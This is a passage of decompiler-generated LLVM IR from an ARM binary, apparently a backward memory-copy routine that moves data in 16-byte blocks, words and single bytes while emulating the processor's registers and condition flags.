  %v9_175c0 = load i32, i32* %v8_175c0, align 4
  store i32 %v9_175c0, i32* %ip.global-to-local, align 4
  %v10_175c0 = add i32 %v0_175c0, -16
  %v11_175c0 = inttoptr i32 %v10_175c0 to i32*
  %v12_175c0 = load i32, i32* %v11_175c0, align 4
  store i32 %v12_175c0, i32* %lr.global-to-local, align 4
  store i32 %v10_175c0, i32* %r1.global-to-local, align 4
  %v1_175c4 = add i32 %v0_175c4, -16
  %v2_175c4 = inttoptr i32 %v1_175c4 to i32*
  store i32 %v3_175c0, i32* %v2_175c4, align 4
  %v4_175c4 = add i32 %v0_175c4, -12
  %v5_175c4 = inttoptr i32 %v4_175c4 to i32*
  %v6_175c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_175c4, i32* %v5_175c4, align 4
  %v7_175c4 = add i32 %v0_175c4, -8
  %v8_175c4 = inttoptr i32 %v7_175c4 to i32*
  %v9_175c4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_175c4, i32* %v8_175c4, align 4
  %v10_175c4 = add i32 %v0_175c4, -4
  %v11_175c4 = inttoptr i32 %v10_175c4 to i32*
  %v12_175c4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_175c4, i32* %v11_175c4, align 4
  store i32 %v1_175c4, i32* %r0.global-to-local, align 4
  %v0_175c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_175c8 = add i32 %v0_175c8, -4
  %v2_175c8 = inttoptr i32 %v1_175c8 to i32*
  %v3_175c8 = load i32, i32* %v2_175c8, align 4
  store i32 %v3_175c8, i32* %r3.global-to-local, align 4
  %v4_175c8 = add i32 %v0_175c8, -8
  %v5_175c8 = inttoptr i32 %v4_175c8 to i32*
  %v6_175c8 = load i32, i32* %v5_175c8, align 4
  store i32 %v6_175c8, i32* %r4.global-to-local, align 4
  %v7_175c8 = add i32 %v0_175c8, -12
  %v8_175c8 = inttoptr i32 %v7_175c8 to i32*
  %v9_175c8 = load i32, i32* %v8_175c8, align 4
  store i32 %v9_175c8, i32* @ip, align 4
  %v10_175c8 = add i32 %v0_175c8, -16
  %v11_175c8 = inttoptr i32 %v10_175c8 to i32*
  %v12_175c8 = load i32, i32* %v11_175c8, align 4
  store i32 %v12_175c8, i32* %lr.global-to-local, align 4
  store i32 %v10_175c8, i32* @r1, align 4
  %v1_175cc = add i32 %v0_175c4, -32
  %v2_175cc = inttoptr i32 %v1_175cc to i32*
  store i32 %v3_175c8, i32* %v2_175cc, align 4
  %v4_175cc = add i32 %v0_175c4, -28
  %v5_175cc = inttoptr i32 %v4_175cc to i32*
  %v6_175cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_175cc, i32* %v5_175cc, align 4
  %v7_175cc = add i32 %v0_175c4, -24
  %v8_175cc = inttoptr i32 %v7_175cc to i32*
  %v9_175cc = load i32, i32* @ip, align 4
  store i32 %v9_175cc, i32* %v8_175cc, align 4
  %v10_175cc = add i32 %v0_175c4, -20
  %v11_175cc = inttoptr i32 %v10_175cc to i32*
  %v12_175cc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_175cc, i32* %v11_175cc, align 4
  store i32 %v1_175cc, i32* %r0.global-to-local, align 4
  %v0_175d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_175d0 = add i32 %v0_175d0, -32
  store i32 %v2_175d0, i32* %r2.global-to-local, align 4
  %v6_175d4 = icmp slt i32 %v0_175d0, 32
  br i1 %v6_175d4, label %dec_label_pc_175d8.loopexit, label %dec_label_pc_175c0.dec_label_pc_175c0_crit_edge

dec_label_pc_175c0.dec_label_pc_175c0_crit_edge:  ; preds = %dec_label_pc_175c0
  %v0_175c0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_175c0

dec_label_pc_175d8.loopexit:                      ; preds = %dec_label_pc_175c0
  %v4_175d0 = sub i32 31, %v0_175d0
  %v5_175d0 = and i32 %v4_175d0, %v0_175d0
  %v6_175d0 = icmp slt i32 %v5_175d0, 0
  %v7_175d0 = icmp slt i32 %v2_175d0, 0
  store i1 %v6_175d0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_175d0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_175d8

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175d8.loopexit, %dec_label_pc_175b4
  %v6_175e0 = phi i32 [ %v1_175cc, %dec_label_pc_175d8.loopexit ], [ %v0_175c449, %dec_label_pc_175b4 ]
  %v0_175e8.pr = phi i32 [ %v2_175d0, %dec_label_pc_175d8.loopexit ], [ %v2_175b8, %dec_label_pc_175b4 ]
  %v4_175d8 = add i32 %v0_175e8.pr, 16
  %v6_175d8 = sub i32 0, %v0_175e8.pr
  %v7_175d8 = and i32 %v4_175d8, %v6_175d8
  %v8_175d8 = icmp slt i32 %v7_175d8, 0
  store i1 %v8_175d8, i1* %cpsr_v.global-to-local, align 1
  %v9_175d8 = icmp slt i32 %v4_175d8, 0
  store i1 %v9_175d8, i1* %cpsr_n.global-to-local, align 1
  %v5_175dc = icmp slt i32 %v0_175e8.pr, -16
  br i1 %v5_175dc, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_175d8
  %v6_175dc = load i32, i32* @r1, align 4
  %v7_175dc = add i32 %v6_175dc, -4
  %v8_175dc = inttoptr i32 %v7_175dc to i32*
  %v9_175dc = load i32, i32* %v8_175dc, align 4
  store i32 %v9_175dc, i32* %r3.global-to-local, align 4
  %v10_175dc = add i32 %v6_175dc, -8
  %v11_175dc = inttoptr i32 %v10_175dc to i32*
  %v12_175dc = load i32, i32* %v11_175dc, align 4
  store i32 %v12_175dc, i32* %r4.global-to-local, align 4
  %v13_175dc = add i32 %v6_175dc, -12
  %v14_175dc = inttoptr i32 %v13_175dc to i32*
  %v15_175dc = load i32, i32* %v14_175dc, align 4
  store i32 %v15_175dc, i32* @ip, align 4
  %v16_175dc = add i32 %v6_175dc, -16
  %v17_175dc = inttoptr i32 %v16_175dc to i32*
  %v18_175dc = load i32, i32* %v17_175dc, align 4
  store i32 %v18_175dc, i32* %lr.global-to-local, align 4
  store i32 %v16_175dc, i32* @r1, align 4
  %v7_175e0 = add i32 %v6_175e0, -16
  %v8_175e0 = inttoptr i32 %v7_175e0 to i32*
  store i32 %v9_175dc, i32* %v8_175e0, align 4
  %v10_175e0 = add i32 %v6_175e0, -12
  %v11_175e0 = inttoptr i32 %v10_175e0 to i32*
  %v12_175e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_175e0, i32* %v11_175e0, align 4
  %v13_175e0 = add i32 %v6_175e0, -8
  %v14_175e0 = inttoptr i32 %v13_175e0 to i32*
  %v15_175e0 = load i32, i32* @ip, align 4
  store i32 %v15_175e0, i32* %v14_175e0, align 4
  %v16_175e0 = add i32 %v6_175e0, -4
  %v17_175e0 = inttoptr i32 %v16_175e0 to i32*
  %v18_175e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_175e0, i32* %v17_175e0, align 4
  store i32 %v7_175e0, i32* %r0.global-to-local, align 4
  %v6_175e4 = load i32, i32* %r2.global-to-local, align 4
  %v7_175e4 = add i32 %v6_175e4, -16
  store i32 %v7_175e4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_175d8, %bb140
  %v6_175f0 = phi i32 [ %v7_175e0, %bb140 ], [ %v6_175e0, %dec_label_pc_175d8 ]
  %v0_175e8 = phi i32 [ %v7_175e4, %bb140 ], [ %v0_175e8.pr, %dec_label_pc_175d8 ]
  %v4_175e8 = add i32 %v0_175e8, 20
  store i32 %v4_175e8, i32* %r2.global-to-local, align 4
  %v6_175e8 = sub i32 0, %v0_175e8
  %v7_175e8 = and i32 %v4_175e8, %v6_175e8
  %v8_175e8 = icmp slt i32 %v7_175e8, 0
  store i1 %v8_175e8, i1* %cpsr_v.global-to-local, align 1
  %v9_175e8 = icmp slt i32 %v4_175e8, 0
  store i1 %v9_175e8, i1* %cpsr_n.global-to-local, align 1
  %v5_175ec = icmp slt i32 %v0_175e8, -20
  br i1 %v5_175ec, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_175ec = load i32, i32* @r1, align 4
  %v7_175ec = add i32 %v6_175ec, -4
  %v8_175ec = inttoptr i32 %v7_175ec to i32*
  %v9_175ec = load i32, i32* %v8_175ec, align 4
  store i32 %v9_175ec, i32* %r3.global-to-local, align 4
  %v10_175ec = add i32 %v6_175ec, -8
  %v11_175ec = inttoptr i32 %v10_175ec to i32*
  %v12_175ec = load i32, i32* %v11_175ec, align 4
  store i32 %v12_175ec, i32* @ip, align 4
  %v13_175ec = add i32 %v6_175ec, -12
  %v14_175ec = inttoptr i32 %v13_175ec to i32*
  %v15_175ec = load i32, i32* %v14_175ec, align 4
  store i32 %v15_175ec, i32* %lr.global-to-local, align 4
  store i32 %v13_175ec, i32* @r1, align 4
  %v7_175f0 = add i32 %v6_175f0, -12
  %v8_175f0 = inttoptr i32 %v7_175f0 to i32*
  store i32 %v9_175ec, i32* %v8_175f0, align 4
  %v10_175f0 = add i32 %v6_175f0, -8
  %v11_175f0 = inttoptr i32 %v10_175f0 to i32*
  %v12_175f0 = load i32, i32* @ip, align 4
  store i32 %v12_175f0, i32* %v11_175f0, align 4
  %v13_175f0 = add i32 %v6_175f0, -4
  %v14_175f0 = inttoptr i32 %v13_175f0 to i32*
  %v15_175f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_175f0, i32* %v14_175f0, align 4
  store i32 %v7_175f0, i32* %r0.global-to-local, align 4
  %v6_175f4 = load i32, i32* %r2.global-to-local, align 4
  %v7_175f4 = add i32 %v6_175f4, -12
  store i32 %v7_175f4, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_1761457 = phi i32 [ %v6_175f0, %.thread14 ], [ %v7_175f0, %bb141 ]
  %v0_175fc55 = phi i32 [ %v4_175e8, %.thread14 ], [ %v7_175f4, %bb141 ]
  %v2_175f8 = load i8*, i8** %stack_var_-8, align 4
  %v3_175f8 = ptrtoint i8* %v2_175f8 to i32
  store i32 %v3_175f8, i32* @r4, align 4
  store i32 %v8_175b4, i32* @lr, align 4
  br label %dec_label_pc_175fc

dec_label_pc_175fc:                               ; preds = %dec_label_pc_175ac, %.thread16
  %v7_1760c = phi i32 [ %v0_175c449, %dec_label_pc_175ac ], [ %v6_1761457, %.thread16 ]
  %v0_175fc = phi i32 [ %v2_175ac, %dec_label_pc_175ac ], [ %v0_175fc55, %.thread16 ]
  %v2_175fc = add i32 %v0_175fc, 8
  store i32 %v2_175fc, i32* %r2.global-to-local, align 4
  %v4_175fc = sub i32 0, %v0_175fc
  %v5_175fc = and i32 %v2_175fc, %v4_175fc
  %v6_175fc = icmp slt i32 %v5_175fc, 0
  store i1 %v6_175fc, i1* %cpsr_v.global-to-local, align 1
  %v7_175fc = icmp slt i32 %v2_175fc, 0
  store i1 %v7_175fc, i1* %cpsr_n.global-to-local, align 1
  %v5_17600 = icmp slt i32 %v0_175fc, -8
  br i1 %v5_17600, label %bb143, label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_175fc
  %v6_17604 = add i32 %v0_175fc, 4
  store i32 %v6_17604, i32* %r2.global-to-local, align 4
  %v8_17604 = sub i32 -5, %v0_175fc
  %v9_17604 = and i32 %v8_17604, %v2_175fc
  %v10_17604 = icmp slt i32 %v9_17604, 0
  store i1 %v10_17604, i1* %cpsr_v.global-to-local, align 1
  %v11_17604 = icmp slt i32 %v6_17604, 0
  store i1 %v11_17604, i1* %cpsr_n.global-to-local, align 1
  %v5_17608 = icmp slt i32 %v2_175fc, 4
  %v6_17608 = load i32, i32* @r1, align 4
  %v7_17608 = add i32 %v6_17608, -4
  %v8_17608 = inttoptr i32 %v7_17608 to i32*
  %v9_17608 = load i32, i32* %v8_17608, align 4
  store i32 %v9_17608, i32* %r3.global-to-local, align 4
  br i1 %v5_17608, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_17604
  store i32 %v7_17608, i32* @r1, align 4
  %v8_1760c = add i32 %v7_1760c, -4
  %v9_1760c = inttoptr i32 %v8_1760c to i32*
  store i32 %v9_17608, i32* %v9_1760c, align 4
  %v10_1760c = load i32, i32* %r0.global-to-local, align 4
  %v11_1760c = add i32 %v10_1760c, -4
  store i32 %v11_1760c, i32* %r0.global-to-local, align 4
  %v0_1761c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_17604
  %v10_17610 = add i32 %v6_17608, -8
  %v11_17610 = inttoptr i32 %v10_17610 to i32*
  %v12_17610 = load i32, i32* %v11_17610, align 4
  store i32 %v12_17610, i32* @ip, align 4
  store i32 %v10_17610, i32* @r1, align 4
  %v7_17614 = add i32 %v7_1760c, -8
  %v8_17614 = inttoptr i32 %v7_17614 to i32*
  store i32 %v9_17608, i32* %v8_17614, align 4
  %v10_17614 = add i32 %v7_1760c, -4
  %v11_17614 = inttoptr i32 %v10_17614 to i32*
  %v12_17614 = load i32, i32* @ip, align 4
  store i32 %v12_17614, i32* %v11_17614, align 4
  store i32 %v7_17614, i32* %r0.global-to-local, align 4
  %v6_17618 = load i32, i32* %r2.global-to-local, align 4
  %v7_17618 = add i32 %v6_17618, -4
  store i32 %v7_17618, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_175fc, %dec_label_pc_1758c, %dec_label_pc_177c0, %dec_label_pc_17754, %dec_label_pc_176e8, %bb142
  %v2_17620 = phi i32 [ %v11_1760c, %.thread20 ], [ %v0_176b832, %.thread26 ], [ %v7_1760c, %dec_label_pc_175fc ], [ %v2_17590, %dec_label_pc_1758c ], [ %v2_1762c65, %dec_label_pc_177c0 ], [ %v2_1762c64, %dec_label_pc_17754 ], [ %v2_1762c63, %dec_label_pc_176e8 ], [ %v7_17614, %bb142 ]
  %v0_1761c = phi i32 [ %v0_1761c.pre, %.thread20 ], [ %v2_17660, %.thread26 ], [ %v2_175fc, %dec_label_pc_175fc ], [ %v2_17594, %dec_label_pc_1758c ], [ %v0_1761c61, %dec_label_pc_177c0 ], [ %v0_1761c60, %dec_label_pc_17754 ], [ %v0_1761c59, %dec_label_pc_176e8 ], [ %v7_17618, %bb142 ]
  %v1_1761c = add i32 %v0_1761c, 4
  store i32 %v1_1761c, i32* @r2, align 4
  %v3_1761c = sub i32 0, %v0_1761c
  %v4_1761c = and i32 %v1_1761c, %v3_1761c
  %v5_1761c = icmp slt i32 %v4_1761c, 0
  store i1 %v5_1761c, i1* %cpsr_v.global-to-local, align 1
  %v6_1761c = icmp slt i32 %v1_1761c, 0
  store i1 %v6_1761c, i1* %cpsr_n.global-to-local, align 1
  %v7_1761c = icmp eq i32 %v1_1761c, 0
  store i1 %v7_1761c, i1* @cpsr_z, align 1
  br i1 %v7_1761c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_17624 = add i32 %v0_1761c, 2
  %v3_17624 = sub i32 -3, %v0_1761c
  %v4_17624 = and i32 %v3_17624, %v1_1761c
  %v5_17624 = icmp slt i32 %v4_17624, 0
  store i1 %v5_17624, i1* %cpsr_v.global-to-local, align 1
  %v6_17624 = icmp slt i32 %v1_17624, 0
  store i1 %v6_17624, i1* %cpsr_n.global-to-local, align 1
  %v7_17624 = icmp eq i32 %v1_1761c, 2
  store i1 %v7_17624, i1* @cpsr_z, align 1
  %v0_17628 = load i32, i32* @r1, align 4
  %v1_17628 = add i32 %v0_17628, -1
  %v2_17628 = inttoptr i32 %v1_17628 to i8*
  %v3_17628 = load i8, i8* %v2_17628, align 1
  %v4_17628 = zext i8 %v3_17628 to i32
  store i32 %v4_17628, i32* %r3.global-to-local, align 4
  store i32 %v1_17628, i32* @r1, align 4
  %v3_1762c = add i32 %v2_17620, -1
  %v4_1762c = inttoptr i32 %v3_1762c to i8*
  store i8 %v3_17628, i8* %v4_1762c, align 1
  %v5_1762c = load i32, i32* %r0.global-to-local, align 4
  %v6_1762c = add i32 %v5_1762c, -1
  store i32 %v6_1762c, i32* %r0.global-to-local, align 4
  %v0_17630 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_17630 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_17630 = xor i1 %v0_17630, %v1_17630
  br i1 %v2_17630, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_17630 = load i32, i32* @r1, align 4
  %v4_17630 = add i32 %v3_17630, -1
  %v5_17630 = inttoptr i32 %v4_17630 to i8*
  %v6_17630 = load i8, i8* %v5_17630, align 1
  %v7_17630 = zext i8 %v6_17630 to i32
  store i32 %v7_17630, i32* %r3.global-to-local, align 4
  store i32 %v4_17630, i32* @r1, align 4
  %v6_17634 = add i32 %v5_1762c, -2
  %v7_17634 = inttoptr i32 %v6_17634 to i8*
  store i8 %v6_17630, i8* %v7_17634, align 1
  %v8_17634 = load i32, i32* %r0.global-to-local, align 4
  %v9_17634 = add i32 %v8_17634, -1
  store i32 %v9_17634, i32* %r0.global-to-local, align 4
  %v1_17638.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17638.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_1763c = phi i32 [ %v9_17634, %bb145 ], [ %v6_1762c, %bb144 ]
  %v2_1763c = phi i1 [ %v2_17638.pre, %bb145 ], [ %v1_17630, %bb144 ]
  %v1_1763c = phi i1 [ %v1_17638.pre, %bb145 ], [ %v0_17630, %bb144 ]
  %v0_17638 = load i1, i1* @cpsr_z, align 1
  %v3_17638 = xor i1 %v2_1763c, %v1_1763c
  %v4_17638 = or i1 %v0_17638, %v3_17638
  br i1 %v4_17638, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_17638 = load i32, i32* @r1, align 4
  %v6_17638 = add i32 %v5_17638, -1
  %v7_17638 = inttoptr i32 %v6_17638 to i8*
  %v8_17638 = load i8, i8* %v7_17638, align 1
  %v9_17638 = zext i8 %v8_17638 to i32
  store i32 %v9_17638, i32* %r3.global-to-local, align 4
  store i32 %v6_17638, i32* @r1, align 4
  %v8_1763c = add i32 %v7_1763c, -1
  %v9_1763c = inttoptr i32 %v8_1763c to i8*
  store i8 %v8_17638, i8* %v9_1763c, align 1
  %v10_1763c = load i32, i32* %r0.global-to-local, align 4
  %v11_1763c = add i32 %v10_1763c, -1
  store i32 %v11_1763c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_17644:                               ; preds = %dec_label_pc_1759c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_17644 = icmp eq i32 %v1_1759c, 1
  store i1 %v8_17644, i1* %cpsr_n.global-to-local, align 1
  %v1_17648 = add i32 %v2_1758c, -1
  %v2_17648 = inttoptr i32 %v1_17648 to i8*
  %v3_17648 = load i8, i8* %v2_17648, align 1
  %v4_17648 = zext i8 %v3_17648 to i32
  store i32 %v4_17648, i32* %r3.global-to-local, align 4
  store i32 %v1_17648, i32* @r1, align 4
  %v3_1764c = add i32 %v2_17590, -1
  %v4_1764c = inttoptr i32 %v3_1764c to i8*
  store i8 %v3_17648, i8* %v4_1764c, align 1
  %v5_1764c = load i32, i32* %r0.global-to-local, align 4
  %v6_1764c = add i32 %v5_1764c, -1
  store i32 %v6_1764c, i32* %r0.global-to-local, align 4
  br i1 %v8_17644, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_17644
  %v9_17644 = icmp eq i32 %v1_1759c, 2
  %v6_17650 = load i32, i32* @r1, align 4
  %v7_17650 = add i32 %v6_17650, -1
  %v8_17650 = inttoptr i32 %v7_17650 to i8*
  %v9_17650 = load i8, i8* %v8_17650, align 1
  %v10_17650 = zext i8 %v9_17650 to i32
  store i32 %v10_17650, i32* %r3.global-to-local, align 4
  store i32 %v7_17650, i32* @r1, align 4
  %v9_17654 = add i32 %v5_1764c, -2
  %v10_17654 = inttoptr i32 %v9_17654 to i8*
  store i8 %v9_17650, i8* %v10_17654, align 1
  %v11_17654 = load i32, i32* %r0.global-to-local, align 4
  %v12_17654 = add i32 %v11_17654, -1
  store i32 %v12_17654, i32* %r0.global-to-local, align 4
  br i1 %v9_17644, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_17658 = load i32, i32* @r1, align 4
  %v9_17658 = add i32 %v8_17658, -1
  %v10_17658 = inttoptr i32 %v9_17658 to i8*
  %v11_17658 = load i8, i8* %v10_17658, align 1
  %v12_17658 = zext i8 %v11_17658 to i32
  store i32 %v12_17658, i32* %r3.global-to-local, align 4
  store i32 %v9_17658, i32* @r1, align 4
  %v11_1765c = add i32 %v11_17654, -2
  %v12_1765c = inttoptr i32 %v11_1765c to i8*
  store i8 %v11_17658, i8* %v12_1765c, align 1
  %v13_1765c = load i32, i32* %r0.global-to-local, align 4
  %v14_1765c = add i32 %v13_1765c, -1
  store i32 %v14_1765c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_17644, %bb148
  %v0_176b832 = phi i32 [ %v12_17654, %bb147 ], [ %v6_1764c, %dec_label_pc_17644 ], [ %v14_1765c, %bb148 ]
  %v0_17660 = load i32, i32* %r2.global-to-local, align 4
  %v1_17660 = load i32, i32* @ip, align 4
  %v2_17660 = sub i32 %v0_17660, %v1_17660
  store i32 %v2_17660, i32* %r2.global-to-local, align 4
  %v4_17660 = xor i32 %v1_17660, %v0_17660
  %v5_17660 = xor i32 %v2_17660, %v0_17660
  %v6_17660 = and i32 %v5_17660, %v4_17660
  %v7_17660 = icmp slt i32 %v6_17660, 0
  store i1 %v7_17660, i1* %cpsr_v.global-to-local, align 1
  %v8_17660 = icmp slt i32 %v2_17660, 0
  store i1 %v8_17660, i1* %cpsr_n.global-to-local, align 1
  %v5_17664 = icmp slt i32 %v0_17660, %v1_17660
  br i1 %v5_17664, label %bb143, label %dec_label_pc_17668

dec_label_pc_17668:                               ; preds = %.thread26
  %v0_17668 = load i32, i32* @r1, align 4
  %v1_17668 = urem i32 %v0_17668, 4
  store i32 %v1_17668, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17668 = icmp eq i32 %v1_17668, 0
  br i1 %v2_17668, label %dec_label_pc_175ac, label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %dec_label_pc_175a4, %dec_label_pc_17668
  %v0_176b831 = phi i32 [ %v2_17590, %dec_label_pc_175a4 ], [ %v0_176b832, %dec_label_pc_17668 ]
  %v0_17764 = phi i32 [ %v2_17594, %dec_label_pc_175a4 ], [ %v2_17660, %dec_label_pc_17668 ]
  %v0_17670 = phi i32 [ %v2_1758c, %dec_label_pc_175a4 ], [ %v0_17668, %dec_label_pc_17668 ]
  %v0_17678 = phi i32 [ %v1_175a4, %dec_label_pc_175a4 ], [ %v1_17668, %dec_label_pc_17668 ]
  %v1_17670 = and i32 %v0_17670, -4
  store i32 %v1_17670, i32* %r1.global-to-local, align 4
  %v1_17674 = inttoptr i32 %v1_17670 to i32*
  %v2_17674 = load i32, i32* %v1_17674, align 4
  store i32 %v2_17674, i32* %r3.global-to-local, align 4
  %v7_17678 = icmp ult i32 %v0_17678, 2
  %v2_1775c = add i32 %v0_17764, -12
  %v4_1775c = sub i32 11, %v0_17764
  %v5_1775c = and i32 %v4_1775c, %v0_17764
  %v6_1775c = icmp slt i32 %v5_1775c, 0
  store i1 %v6_1775c, i1* %cpsr_v.global-to-local, align 1
  %v7_1775c = icmp slt i32 %v2_1775c, 0
  store i1 %v7_1775c, i1* %cpsr_n.global-to-local, align 1
  %v5_17760 = icmp slt i32 %v0_17764, 12
  br i1 %v7_17678, label %dec_label_pc_1775c, label %dec_label_pc_17680

dec_label_pc_17680:                               ; preds = %dec_label_pc_17670
  %v8_17678 = icmp eq i32 %v0_17678, 2
  br i1 %v8_17678, label %dec_label_pc_176f0, label %dec_label_pc_17684

dec_label_pc_17684:                               ; preds = %dec_label_pc_17680
  br i1 %v5_17760, label %dec_label_pc_176d0, label %dec_label_pc_1768c

dec_label_pc_1768c:                               ; preds = %dec_label_pc_17684
  store i32 %v2_1775c, i32* %r2.global-to-local, align 4
  %v3_17690 = load i32, i32* @r4, align 4
  store i32 %v3_17690, i32* %stack_var_-12, align 4
  %v6_17690 = load i32, i32* @r5, align 4
  %v8_17690 = inttoptr i32 %v6_17690 to i8*
  store i8* %v8_17690, i8** %stack_var_-8, align 4
  %v11_17690 = load i32, i32* @lr, align 4
  br label %dec_label_pc_17694

dec_label_pc_17694:                               ; preds = %dec_label_pc_17694.dec_label_pc_17694_crit_edge, %dec_label_pc_1768c
  %v0_176b8 = phi i32 [ %v1_176b8, %dec_label_pc_17694.dec_label_pc_17694_crit_edge ], [ %v0_176b831, %dec_label_pc_1768c ]
  %v0_17698 = phi i32 [ %v0_17698.pre, %dec_label_pc_17694.dec_label_pc_17694_crit_edge ], [ %v1_17670, %dec_label_pc_1768c ]
  %v0_17694 = phi i32 [ %v0_17694.pre, %dec_label_pc_17694.dec_label_pc_17694_crit_edge ], [ %v2_17674, %dec_label_pc_1768c ]
  %v3_17694 = mul i32 %v0_17694, 256
  store i32 %v3_17694, i32* %lr.global-to-local, align 4
  %v1_17698 = add i32 %v0_17698, -4
  %v2_17698 = inttoptr i32 %v1_17698 to i32*
  %v3_17698 = load i32, i32* %v2_17698, align 4
  store i32 %v3_17698, i32* %r3.global-to-local, align 4
  %v4_17698 = add i32 %v0_17698, -8
  %v5_17698 = inttoptr i32 %v4_17698 to i32*
  %v6_17698 = load i32, i32* %v5_17698, align 4
  store i32 %v6_17698, i32* %r4.global-to-local, align 4
  %v7_17698 = add i32 %v0_17698, -12
  %v8_17698 = inttoptr i32 %v7_17698 to i32*
  %v9_17698 = load i32, i32* %v8_17698, align 4
  store i32 %v9_17698, i32* %r5.global-to-local, align 4
  %v10_17698 = add i32 %v0_17698, -16
  %v11_17698 = inttoptr i32 %v10_17698 to i32*
  %v12_17698 = load i32, i32* %v11_17698, align 4
  store i32 %v10_17698, i32* %r1.global-to-local, align 4
  %v4_1769c = udiv i32 %v12_17698, 16777216
  %v5_1769c = or i32 %v4_1769c, %v3_17694
  store i32 %v5_1769c, i32* %lr.global-to-local, align 4
  %v3_176a0 = mul i32 %v12_17698, 256
  %v4_176a4 = udiv i32 %v9_17698, 16777216
  %v5_176a4 = or i32 %v3_176a0, %v4_176a4
  store i32 %v5_176a4, i32* @ip, align 4
  %v3_176a8 = mul i32 %v9_17698, 256
  %v4_176ac = udiv i32 %v6_17698, 16777216
  %v5_176ac = or i32 %v3_176a8, %v4_176ac
  store i32 %v5_176ac, i32* %r5.global-to-local, align 4
  %v3_176b0 = mul i32 %v6_17698, 256
  %v4_176b4 = udiv i32 %v3_17698, 16777216
  %v5_176b4 = or i32 %v3_176b0, %v4_176b4
  store i32 %v5_176b4, i32* %r4.global-to-local, align 4
  %v1_176b8 = add i32 %v0_176b8, -16
  %v2_176b8 = inttoptr i32 %v1_176b8 to i32*
  store i32 %v5_176b4, i32* %v2_176b8, align 4
  %v4_176b8 = add i32 %v0_176b8, -12
  %v5_176b8 = inttoptr i32 %v4_176b8 to i32*
  %v6_176b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_176b8, i32* %v5_176b8, align 4
  %v7_176b8 = add i32 %v0_176b8, -8
  %v8_176b8 = inttoptr i32 %v7_176b8 to i32*
  %v9_176b8 = load i32, i32* @ip, align 4
  store i32 %v9_176b8, i32* %v8_176b8, align 4
  %v10_176b8 = add i32 %v0_176b8, -4
  %v11_176b8 = inttoptr i32 %v10_176b8 to i32*
  %v12_176b8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_176b8, i32* %v11_176b8, align 4
  store i32 %v1_176b8, i32* %r0.global-to-local, align 4
  %v0_176bc = load i32, i32* %r2.global-to-local, align 4
  %v2_176bc = add i32 %v0_176bc, -16
  store i32 %v2_176bc, i32* %r2.global-to-local, align 4
  %v6_176c0 = icmp slt i32 %v0_176bc, 16
  br i1 %v6_176c0, label %dec_label_pc_176c4, label %dec_label_pc_17694.dec_label_pc_17694_crit_edge

dec_label_pc_17694.dec_label_pc_17694_crit_edge:  ; preds = %dec_label_pc_17694
  %v0_17694.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_17698.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17694

dec_label_pc_176c4:                               ; preds = %dec_label_pc_17694
  %v2_176c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_176c4, i32* @r4, align 4
  %v5_176c4 = load i8*, i8** %stack_var_-8, align 4
  %v6_176c4 = ptrtoint i8* %v5_176c4 to i32
  store i32 %v6_176c4, i32* @r5, align 4
  store i32 %v11_17690, i32* @lr, align 4
  %v2_176c8 = add i32 %v0_176bc, -4
  store i32 %v2_176c8, i32* %r2.global-to-local, align 4
  %v4_176c8 = add i32 %v0_176bc, 2147483632
  %v5_176c8 = and i32 %v2_176c8, %v4_176c8
  %v6_176c8 = icmp slt i32 %v5_176c8, 0
  store i1 %v6_176c8, i1* %cpsr_v.global-to-local, align 1
  %v7_176c8 = icmp slt i32 %v2_176c8, 0
  store i1 %v7_176c8, i1* %cpsr_n.global-to-local, align 1
  %v5_176cc = icmp slt i32 %v2_176bc, -12
  br i1 %v5_176cc, label %dec_label_pc_176e8, label %dec_label_pc_176d0

dec_label_pc_176d0:                               ; preds = %dec_label_pc_176c4, %dec_label_pc_17684, %dec_label_pc_176d0
  %v1_176dc = phi i32 [ %v5_176dc, %dec_label_pc_176d0 ], [ %v1_176b8, %dec_label_pc_176c4 ], [ %v0_176b831, %dec_label_pc_17684 ]
